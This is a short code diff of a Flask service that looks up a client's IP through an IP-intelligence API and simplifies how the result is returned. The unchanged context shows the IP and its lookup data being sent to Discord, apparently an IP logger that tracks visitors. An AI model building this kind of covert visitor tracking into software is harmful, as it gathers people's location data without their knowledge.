@@ -53,11 +53,7 @@ def get_ip():
     response = requests.get(f"https://ip-intelligence.abstractapi.com/v1/?api_key={ABSTRACT_API_KEY}&ip_address=" + ip)
     data = json.loads(response.text)
     send_ip_to_discord(ip, data)
-    list = json.loads(jsonify({"ip": ip}))
-    merged = {**list, **data}
-    merged_json = json.dumps(merged, indent=4)
-    return merged_json
-    #return jsonify({"ip": ip})
+    return response.json()  # Return the JSON response directly
 
 def run_flask():
     app.run(host='0.0.0.0', port=OUTSIDE_PORT)
